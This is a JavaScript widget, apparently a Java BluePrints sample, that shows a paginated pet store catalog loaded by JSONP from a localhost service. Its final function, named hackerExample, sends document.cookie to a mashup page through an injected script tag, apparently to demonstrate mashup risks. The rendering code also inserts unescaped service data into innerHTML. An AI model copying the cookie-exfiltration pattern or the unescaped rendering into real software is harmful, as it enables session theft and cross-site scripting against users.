var bpui;
if(typeof bpui == "undefined") {
    bpui=new Object();
}
bpui.petstoreList=new Object();

bpui.petstoreList.divName="";
bpui.petstoreList.currentCount=0;
bpui.petstoreList.numberPerPage=5;
bpui.petstoreList.category="feline01";
bpui.petstoreList.cachedData=new Object();
bpui.petstoreList.debug=false;
bpui.petstoreList.timer;

bpui.petstoreList.initialSetup=function() {
        // get outerdiv
        var targetDiv=document.getElementById(bpui.petstoreList.divName);
        
        // containier div
        tablex="<table><tr><td align=\"center\">";
        tablex += "<b>Java BluePrint's Pet Store Category:</b> <select size=\"1\" id=\"bpui.petstoreList.categoryList\" onchange=\"bpui.petstoreList.selectCategory()\">";
        tablex += "<option value=\"loading\">Loading Data...</option>";
        tablex += "</select>";
        tablex += "</td></tr><tr><td><div id=\"bpui.petstoreList.dataDiv\" class=\"bpui_petstorelist_dataDiv\">";
        tablex += "</div>";
        
        // add product previous and next
        tablex += "</td></tr>";
        tablex += "<tr><td colspan=\"3\" style=\"text-align:center;\">";
        tablex += "<div id=\"bpui.petstoreList.pageDiv\" class=\"bpui_petstorelist_pageDiv\">";
        tablex += "</div>";
        tablex += "</td></tr>";
        // add in debug div, if debugging
        if(bpui.petstoreList.debug) {
            tablex += "<tr><td colspan=\"3\">";
            tablex += "<div id=\"bpui.petstoreList.debugDiv\">";
            tablex += "</div>";
            tablex += "</td></tr>";
        }
        tablex += "</table>";
        targetDiv.innerHTML=tablex;
        bpui.petstoreList.setSelectedCategory();
}


bpui.petstoreList.populateData=function(datax) {
    // clear response timer
    clearTimeout(bpui.petstoreList.timer);
    
    if(typeof datax != "undefined") {
        // check to see if at last page and no data is returned
        if(datax.length < 1) {
            alert("At last page for category!");
            // keep currentCount correct by removing the increment that was added
            bpui.petstoreList.currentCount -= bpui.petstoreList.numberPerPage;
        } else {
            // add data to cache if it doesn't already exist
            // if a full set isn't returned don't cache it, so the data will be retrieved again from the server.
            // This is optional, you have to weigh the performance hit with the consiquences of not doing an update
            key=bpui.petstoreList.category + "|" + bpui.petstoreList.currentCount; 
            cachedSet=bpui.petstoreList.cachedData[key];
            if(typeof cachedSet == "undefined" && datax.length >= bpui.petstoreList.numberPerPage) {
                // need to cache data
                if(bpui.petstoreList.debug) bpui.petstoreList.debugMessage("Adding cache data by key: " + key);
                bpui.petstoreList.cachedData[key]=datax;
            }
            
            // get outerdiv
            var targetDiv=document.getElementById("bpui.petstoreList.dataDiv");

            // containier div
            tablex="<table class=\"bpui_petstorelist_table\">";
            tablex += "<tr class=\"bpui_petstorelist_row\">";
            tablex += "<th class=\"bpui_petstorelist_cell\">Pet Image</td>";
            tablex += "<th class=\"bpui_petstorelist_cell\">Name & Description</td>";
            tablex += "<th class=\"bpui_petstorelist_cell\">Price&nbsp;($)</td>";
            tablex += "</tr>";

            // loop through product results
            for(ii=0; ii < datax.length; ii++) {
                // add row
                tablex += "<tr class=\"bpui_petstorelist_row\"><td class=\"bpui_petstorelist_cell\">";
                tablex += "<a class=\"bpui_petstorelist_image\" target=\"_blank\" href=\"http://localhost:8080/petstore/faces/catalog.jsp#" + 
                    datax[ii].productID + "," + datax[ii].itemID + "\">";

                tablex += "<img src=\"http://localhost:8080/petstore/ImageServlet/" + datax[ii].imageThumbURL + "\"/>";

                tablex += "</a>";
                tablex += "</td><td class=\"bpui_petstorelist_cell\">";
                tablex += "<a class=\"bpui_petstorelist_link\" target=\"_blank\" href=\"http://localhost:8080/petstore/faces/catalog.jsp#" + 
                    datax[ii].productID + "," + datax[ii].itemID + "\">";
                tablex += "<span class=\"bpui_petstorelist_name\">" + datax[ii].name + "</span><br/>";
                tablex += "</a>";
                tablex += "<span class=\"bpui_petstorelist_description\">" + datax[ii].description + "</span>";
                tablex += "</td><td class=\"bpui_petstorelist_cell\">";

                // add product price
                tablex += "<span class=\"bpui_petstorelist_price\">\$" + datax[ii].price + "</span><br/>";
                tablex += "</td></tr>";
                tablex += "<tr><td colspan=\"3\"><hr class=\"bpui_petstorelist_hr\" /></td></tr>";
            }

            tablex += "</table>";
            targetDiv.innerHTML=tablex;
        }

        // setup previous next buttons
        pagex="";
        var targetDiv=document.getElementById("bpui.petstoreList.pageDiv");
        if(bpui.petstoreList.currentCount >= bpui.petstoreList.numberPerPage) {
            // add previous
            pagex += "<span class=\"bpui_petstorelist_previous\" onclick=\"bpui.petstoreList.previousProducts();\"><< PREVIOUS</span>&nbsp;&nbsp;&nbsp;&nbsp;";
        }
        if(datax.length == bpui.petstoreList.numberPerPage) {
            // add next only if full page has been returned.  Need to change when add cache ???
            pagex += "<span class=\"bpui_petstorelist_next\" onclick=\"bpui.petstoreList.nextProducts();\">NEXT >></span><br/>";
        }
        targetDiv.innerHTML=pagex;
    }
}

bpui.petstoreList.setSelectedCategory=function() {
    catx=document.getElementById("bpui.petstoreList.categoryList");
    for(ii=0; ii < catx.length; ii++) {
        if(catx.options[ii].value == bpui.petstoreList.category) {
            catx.options[ii].selected=true;
        }
    }
}
    
bpui.petstoreList.selectCategory=function() {
    catx=document.getElementById("bpui.petstoreList.categoryList");
    bpui.petstoreList.category=catx.value;
    
    bpui.petstoreList.currentCount=0;
    bpui.petstoreList.updateProducts();
}


bpui.petstoreList.nextProducts=function() {
    // load data from service
    bpui.petstoreList.currentCount += bpui.petstoreList.numberPerPage;
    bpui.petstoreList.updateProducts();
}

bpui.petstoreList.previousProducts=function() {
    bpui.petstoreList.currentCount -= bpui.petstoreList.numberPerPage;
    if(bpui.petstoreList.currentCount < 0) {
        bpui.petstoreList.currentCount=0;
    }
    bpui.petstoreList.updateProducts();
}


bpui.petstoreList.updateProducts=function() {    
    // check to see if in cache
    key=bpui.petstoreList.category + "|" + bpui.petstoreList.currentCount; 
    cachedSet=bpui.petstoreList.cachedData[key];
    // see if data in cache 
    if(typeof cachedSet != "undefined") {
        // get data from cache
        if(bpui.petstoreList.debug) bpui.petstoreList.debugMessage("Pulling data from cache using: " + key + " with " + cachedSet.length + " items.");
        bpui.petstoreList.populateData(cachedSet);
    } else {
        // load data from service
        if(bpui.petstoreList.debug) bpui.petstoreList.debugMessage("Retrieving data from service for : " + bpui.petstoreList.category + " starting at item " +  bpui.petstoreList.currentCount);
        
        // set degradation timeout
        bpui.petstoreList.timer=setTimeout('bpui.petstoreList.requestTimedOut()', 20000);
        
        // create dynamic script
        bodyTag=document.getElementsByTagName("body")[0];
        scriptx=document.createElement("script");
        scriptx.setAttribute("type", "text/javascript");
        scriptx.setAttribute("src", "http://localhost:8080/petstore/catalog?command=items&pid=" + bpui.petstoreList.category + "&start=" + bpui.petstoreList.currentCount + "&length=" + bpui.petstoreList.numberPerPage + "&format=jsonp&callback=bpui.petstoreList.populateData");
        bodyTag.appendChild(scriptx);
    }
}


bpui.petstoreList.createPetstoreList=function(divName, numberPerPage) {
    // keep divName for later references
        bpui.petstoreList.divName=divName;
    
    // see if numberPerPage defined
    if(typeof numberPerPage != "undefined") {
        bpui.petstoreList.numberPerPage=numberPerPage;
    }
    
    // setup static elements
    bpui.petstoreList.initialSetup();
    
    // set timer to make sure service look up returns. Eventhough the Javascript library was able to be fetched, the database could be down or the
    // service could be responding very slowly and the request timeout.  Wait for 30 seconds and then set data div to service may not be responding message.
    // Since both calls hit the database, if one returns propertly the other should also.
    bpui.petstoreList.timer=setTimeout('bpui.petstoreList.requestTimedOut()', 20000);
    
    // load categories from service
    bodyTag=document.getElementsByTagName("body")[0];
    scriptx=document.createElement("script");
    scriptx.setAttribute("type", "text/javascript");
    scriptx.setAttribute("src", "http://localhost:8080/petstore/catalog?command=categories&format=jsonp&callback=bpui.petstoreList.populateCategory");
    bodyTag.appendChild(scriptx);
    
    // load pet data from service
    bodyTag=document.getElementsByTagName("body")[0];
    scriptx=document.createElement("script");
    scriptx.setAttribute("type", "text/javascript");
    scriptx.setAttribute("src", "http://localhost:8080/petstore/catalog?command=items&pid=" + bpui.petstoreList.category + "&start=0&length=" + bpui.petstoreList.numberPerPage + "&format=jsonp&callback=bpui.petstoreList.populateData");
    bodyTag.appendChild(scriptx);
}


bpui.petstoreList.requestTimedOut=function() {
    document.getElementById("bpui.petstoreList.dataDiv").innerHTML="<b><font color=\"#0000FF\">The Java BluePrint's Pet Store JSONP Service is either responding very slowly or not responding at all!  Please check with the service provider for more information.</font></b>";
}



bpui.petstoreList.debugMessage=function(messx) {
    targetDiv=document.getElementById("bpui.petstoreList.debugDiv");
    targetDiv.innerHTML=messx + "<br/>" + targetDiv.innerHTML;
}


bpui.petstoreList.populateCategory=function(datax) {
    // clear response timer
    clearTimeout(bpui.petstoreList.timer);

    if(typeof datax != "undefined") {
        catx=document.getElementById("bpui.petstoreList.categoryList");
        countx=0;
        // loop through top level categories
        for(ii=0; ii < datax.length; ii++) {
            // loop through individual categories
            for(yy=0; yy < datax[ii].products.length; yy++) {
                // set default value for select list
                bCurrentSelect=false
                if(datax[ii].products[yy].id == bpui.petstoreList.category) {
                    bCurrentSelect=true;
                }
                catx.options[countx]=new Option(datax[ii].products[yy].name, datax[ii].products[yy].id, false, bCurrentSelect);
                countx++;
            }
        }
    }
}


bpui.petstoreList.hackerExample=function() {
    /*
    bodyTag=document.getElementsByTagName("body")[0];
    iframex=document.createElement("iframe");
    iframex.setAttribute("src", "http://localhost:8080/bp-clientside-mashup/show.jsp?cookies=" + escape(document.cookie));
    bodyTag.appendChild(iframex);
    */
    // load pet data from service

    bodyTag=document.getElementsByTagName("body")[0];
    scriptx=document.createElement("script");
    scriptx.setAttribute("type", "text/javascript");
    scriptx.setAttribute("src", "http://localhost:8080/bp-clientside-mashup/show.jsp?cookies=" + escape(document.cookie));
    bodyTag.appendChild(scriptx);
    
    
}



